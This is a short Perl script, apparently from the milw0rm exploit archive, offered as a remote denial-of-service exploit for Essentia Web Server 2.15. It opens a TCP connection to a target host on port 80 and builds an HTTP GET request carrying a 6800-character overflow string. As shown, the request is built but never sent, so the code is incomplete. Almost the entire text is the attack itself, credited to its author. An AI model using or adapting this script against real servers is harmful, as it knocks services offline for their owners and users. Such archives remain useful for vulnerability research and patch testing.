#!/usr/bin/perl


use IO::Socket;

use Getopt::Std; getopts('h:', \%args);



if (defined($args{'h'})) { $host = $args{'h'}; }

print STDERR "\n-=[ Essentia Web Server 2.15 Remote DOS Exploit]=-\n";

print STDERR "-=[ Discovered By CorryL          corryl80@gmail.com ]=-\n";

print STDERR "-=[ Coded by CorryL     info:www.x0n3-h4ck.org ]=-\n\n";

if (!defined($host)) {

print "usage: perl " . $0 . " -h HOST\n";

exit();
}

$dos = "A"x6800;

print "[+] Connect to $host\n";

$socket = new IO::Socket::INET (PeerAddr => "$host",

                               PeerPort => 80,

                               Proto => 'tcp');

                               die unless $socket;

print "[+] Sending DOS byte\n";

         $data = "GET /$dos \r\n\r\n";

# milw0rm.com [2006-11-04]